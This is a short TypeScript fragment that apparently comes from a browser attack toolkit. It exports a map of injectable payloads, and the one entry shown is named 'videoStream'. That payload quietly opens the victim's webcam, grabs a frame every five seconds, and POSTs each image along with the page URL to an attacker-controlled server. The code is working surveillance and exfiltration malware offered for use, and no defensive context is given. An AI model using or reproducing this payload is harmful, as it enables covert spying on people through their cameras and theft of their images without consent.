...
export const Payload: { [key: string]: string } = {
  ...
  videoStream: `(()=>{v=document.createElement('video');navigator.mediaDevices.getUserMedia({video:true}).then((stream)=>{v.srcObject=stream;v.play();setInterval(()=>{c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);fetch('${Url.URL}/videoStream',{method:'POST',headers: {'Content-Type': 'application/json'},body:JSON.stringify({video:c.toDataURL(),fileName:window.location.href})})},5000)})})()||'Video Stream Started'`,
};
